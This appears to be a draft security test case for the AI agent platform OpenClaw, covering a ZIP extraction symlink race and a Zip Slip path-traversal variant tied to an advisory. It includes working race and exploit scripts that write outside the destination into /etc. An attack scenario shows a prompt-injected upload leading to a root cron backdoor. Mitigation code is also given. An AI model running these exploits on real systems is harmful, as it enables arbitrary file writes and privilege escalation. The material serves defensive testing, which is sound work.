---
date: 2026-03-13
category: test-cases
subcategory: sandbox-escape
severity: medium
test_id: TC-SE-006
status: draft
ghsa: GHSA-r54r-wmmq-mh84
---

# Test 6: ZIP Extraction Race

## Test Overview

| Item | Content |
|------|---------|
| Test ID | TC-SE-006 |
| Category | Sandbox Escape |
| Attack Technique | ZIP/archive extraction TOCTOU race |
| Severity | Medium |
| Difficulty | Advanced |
| GHSA Reference | [GHSA-r54r](https://github.com/openclaw/openclaw/security/advisories/GHSA-r54r-wmmq-mh84) |
| Fixed In | v2026.3.2 |

## Objective

Verify that OpenClaw's ZIP/archive extraction process is resilient to race conditions where parent directories are replaced with symlinks during extraction, preventing writes outside the intended destination.

## Vulnerability Description

ZIP extraction involves creating parent directories before extracting files. A race condition exists:

1. OpenClaw validates extraction destination is safe
2. OpenClaw creates parent directory `dest/subdir/`
3. **Between directory creation and file extraction**, attacker replaces `dest/subdir/` with symlink to `/etc/`
4. OpenClaw extracts file to `dest/subdir/config` → actually writes to `/etc/config`

**Attack Pattern**:
```
Timeline:
T0: Validate dest/subdir/file.txt → OK (within dest/)
T1: mkdir dest/subdir/
T2: [RACE WINDOW] Attacker: rm -rf dest/subdir && ln -s /etc dest/subdir
T3: Extract to dest/subdir/file.txt → writes to /etc/file.txt ✗
```

This is a variant of TOCTOU but specific to archive extraction workflows.

## Prerequisites

- [ ] OpenClaw v2026.3.1 or earlier (vulnerable)
- [ ] Sandbox enabled
- [ ] ZIP/tar extraction functionality (skills, file upload)
- [ ] Ability to create concurrent processes
- [ ] Root/sudo for target verification

## Test Steps

### Step 1: Create Malicious ZIP Archive

```bash
# Create test ZIP with nested structure
mkdir -p /tmp/ziptest/subdir/deep
echo "MALICIOUS_PAYLOAD" > /tmp/ziptest/subdir/deep/exploit.txt

cd /tmp/ziptest
zip -r malicious.zip subdir/

# Verify ZIP structure
unzip -l malicious.zip
# Expected:
#   subdir/
#   subdir/deep/
#   subdir/deep/exploit.txt
```

### Step 2: Setup Race Script

```bash
#!/bin/bash
# race-zip-extract.sh

DEST="$HOME/.openclaw/workspace/extract"
TARGET="/etc/openclaw-pwned"

while true; do
  # Wait for parent directory creation
  if [ -d "$DEST/subdir" ]; then
    # Race: Replace directory with symlink
    rm -rf "$DEST/subdir"
    ln -s /etc "$DEST/subdir"
    echo "[$(date)] Symlink injected: $DEST/subdir -> /etc"
  fi

  # Restore for next attempt
  sleep 0.001
  rm -f "$DEST/subdir" 2>/dev/null
done
```

### Step 3: Trigger ZIP Extraction

**Method 1: Via skill or file upload**
```bash
# Start race script in background
chmod +x race-zip-extract.sh
./race-zip-extract.sh &
RACE_PID=$!

# Upload and extract malicious ZIP via OpenClaw
# In OpenClaw session:
User: "Extract the uploaded malicious.zip to workspace/extract/"
```

**Method 2: Automated test**
```bash
#!/bin/bash
ATTEMPTS=100
SUCCESS=0

for i in $(seq 1 $ATTEMPTS); do
  echo "Attempt $i"

  # Clean up
  rm -rf ~/.openclaw/workspace/extract
  sudo rm -f /etc/openclaw-pwned/subdir/deep/exploit.txt 2>/dev/null

  # Start race
  ./race-zip-extract.sh &
  RACE_PID=$!

  # Trigger extraction
  openclaw extract malicious.zip --dest workspace/extract/

  # Stop race
  sleep 0.5
  kill $RACE_PID 2>/dev/null
  wait $RACE_PID 2>/dev/null

  # Check if race succeeded
  if sudo [ -f /etc/openclaw-pwned/subdir/deep/exploit.txt ]; then
    SUCCESS=$((SUCCESS + 1))
    echo "✓ Race succeeded! File written outside destination."
  fi
done

echo "Success rate: $SUCCESS / $ATTEMPTS"
```

### Step 4: Verify Exploitation

```bash
# Check if file was written outside destination
sudo ls -la /etc/openclaw-pwned/subdir/deep/exploit.txt
sudo cat /etc/openclaw-pwned/subdir/deep/exploit.txt

# Expected (vulnerable): File exists with "MALICIOUS_PAYLOAD"
# Expected (secure): File does not exist or permission denied

# Check workspace
ls -la ~/.openclaw/workspace/extract/subdir/deep/exploit.txt

# Check for symlinks
find ~/.openclaw/workspace/extract -type l -exec ls -la {} \;
```

### Step 5: Test Zip Slip Variant

**Create Zip Slip archive**:
```bash
# Zip Slip: Paths with ../
mkdir -p /tmp/zipslip/fake
echo "ZIP_SLIP_EXPLOIT" > /tmp/zipslip/fake/file.txt

cd /tmp/zipslip
# Manually create ZIP with .. traversal
zip malicious-slip.zip fake/file.txt
# Edit ZIP to replace "fake/file.txt" with "../../../etc/pwned.txt"
# (requires hex editor or specialized tool)

# Or use Python
python3 << 'EOF'
import zipfile

with zipfile.ZipFile('malicious-slip.zip', 'w') as z:
    z.writestr('../../../etc/pwned.txt', 'ZIP_SLIP_PAYLOAD')
EOF
```

**Test extraction**:
```bash
openclaw extract malicious-slip.zip --dest workspace/extract/

# Check if Zip Slip succeeded
sudo cat /etc/pwned.txt
```

## Expected Results (Secure Behavior)

1. **Parent directory lock**: Directory is locked during extraction
2. **Symlink validation**: Check parent directories before writing each file
3. **Atomic extraction**: Directory structure created atomically
4. **Path sanitization**: `..` paths rejected
5. **Zero success rate**: File never written outside destination

## Failure Criteria (Vulnerable Behavior)

1. **Race succeeds**: File written to `/etc/` or other host location
2. **Symlink accepted**: Parent symlink followed during extraction
3. **Zip Slip works**: `..` paths allow path traversal
4. **No validation**: Directories not re-validated per file

## Test Results

| Item | Content |
|------|---------|
| Execution Date | - |
| Executor | - |
| OpenClaw Version | - |
| Attempts | - |
| Successful Races | - |
| Result | PASS / FAIL |

## Mitigation (If Vulnerable)

### Immediate Actions

1. **Upgrade OpenClaw**: Update to v2026.3.2+ where GHSA-r54r is fixed
2. **Disable ZIP extraction**: Temporarily block archive uploads
3. **Audit extractions**: Check for files outside expected paths

### Long-Term Fixes

**Fix 1: Re-validate parent directory before each file**
```javascript
function extractZipSafely(zipPath, destPath) {
  const zip = new AdmZip(zipPath);
  const entries = zip.getEntries();

  for (const entry of entries) {
    const fullPath = path.join(destPath, entry.entryName);

    // Validate path is within destination
    if (!fullPath.startsWith(destPath)) {
      throw new Error(`Zip Slip detected: ${entry.entryName}`);
    }

    // Create parent directory
    const parentDir = path.dirname(fullPath);
    fs.mkdirSync(parentDir, { recursive: true });

    // ✓ RE-VALIDATE parent is not a symlink (fixes TOCTOU)
    const parentStats = fs.lstatSync(parentDir);
    if (parentStats.isSymbolicLink()) {
      throw new Error(`Symlink detected in extraction path: ${parentDir}`);
    }

    // Extract file
    if (!entry.isDirectory) {
      fs.writeFileSync(fullPath, entry.getData());
    }
  }
}
```

**Fix 2: Extract to temporary directory + atomic rename**
```javascript
function safeExtractZip(zipPath, destPath) {
  // Extract to temporary location first
  const tmpDir = fs.mkdtempSync('/tmp/zip-extract-');

  try {
    // Extract to temp (no race risk)
    extractZipUnsafe(zipPath, tmpDir);

    // Validate extracted contents
    validateNoSymlinks(tmpDir);

    // Atomic move to destination (single syscall, no TOCTOU)
    fs.renameSync(tmpDir, destPath);
  } catch (error) {
    fs.rmSync(tmpDir, { recursive: true, force: true });
    throw error;
  }
}
```

**Fix 3: Use openat-based extraction (Linux)**
```c
int extract_zip_safe(const char *zip_path, const char *dest_path) {
  // Open destination directory, get file descriptor
  int dest_fd = open(dest_path, O_RDONLY | O_DIRECTORY);

  // Extract using *at syscalls (relative to dest_fd)
  for each entry in zip:
    // Create parent dirs relative to dest_fd
    mkdirat(dest_fd, parent_path, 0755);

    // Validate parent is not symlink (using dest_fd)
    struct stat st;
    fstatat(dest_fd, parent_path, &st, AT_SYMLINK_NOFOLLOW);
    if (S_ISLNK(st.st_mode)) {
      return -1; // Symlink detected
    }

    // Write file relative to dest_fd
    int file_fd = openat(dest_fd, file_path, O_CREAT | O_WRONLY | O_NOFOLLOW, 0644);
    write(file_fd, data, len);
    close(file_fd);

  close(dest_fd);
}
```

## Zip Slip vs TOCTOU Race Comparison

| Vulnerability | Mechanism | Detection | Fix |
|---------------|-----------|-----------|-----|
| **Zip Slip** | Static `..` paths in ZIP | Path validation | Reject `..` |
| **TOCTOU Race** | Dynamic symlink replacement | Race detection | Atomic ops, re-validate |
| **Combined** | Both techniques | Both checks | Both fixes |

## Archive Formats Affected

| Format | Vulnerable? | Notes |
|--------|-------------|-------|
| ZIP | Yes | GHSA-r54r |
| TAR | Yes | Similar structure |
| TAR.GZ | Yes | Same as TAR |
| RAR | Likely | Similar extraction logic |
| 7Z | Likely | Complex format, similar risks |

## Related Tests

- **Test 5**: TOCTOU Symlink Race — Generic TOCTOU pattern
- **Test 12**: Plugin Install Path Traversal — Similar to Zip Slip

## References

- [GHSA-r54r-wmmq-mh84](https://github.com/openclaw/openclaw/security/advisories/GHSA-r54r-wmmq-mh84) — Official advisory
- [Zip Slip Vulnerability](https://snyk.io/research/zip-slip-vulnerability)
- [GHSA-p25h-9q54-ffvw](https://github.com/openclaw/openclaw/security/advisories/GHSA-p25h-9q54-ffvw) — Related Zip Slip in tar extraction
- [TOCTOU Research](../../knowledge/vulnerabilities/sandbox-escape/2026-03-12-toctou-sandbox-bypass.md)

## Attack Scenario

**Real-world exploitation**:

```
1. Attacker crafts malicious ZIP with nested structure
   ↓
2. Uploads ZIP via OpenClaw file upload (prompt injection)
   ↓
3. Simultaneously runs race script replacing parent directory
   ↓
4. After 10-100 extraction attempts, race succeeds
   ↓
5. File extracted to /etc/cron.d/backdoor instead of workspace
   ↓
6. Cron executes backdoor with root privileges
```

**Impact**: Arbitrary file write, privilege escalation, persistent backdoor.

## Platform-Specific Notes

### Linux
- Directory symlinks work as expected
- `/tmp` is often on tmpfs (fast, shorter race window)

### macOS
- Similar behavior to Linux
- APFS may have different timing characteristics

### Windows
- Junctions and symlinks both vulnerable
- NTFS has different directory entry semantics

## Notes

- This attack combines Zip Slip (static) and TOCTOU (dynamic) concepts
- Race success rate typically 1-10% depending on timing
- Multiple attempts increase exploitation probability
- Clean up: `sudo rm -rf /etc/openclaw-pwned /etc/pwned.txt`, `rm -rf ~/.openclaw/workspace/extract`
- Always test in isolated environment — file system corruption risk
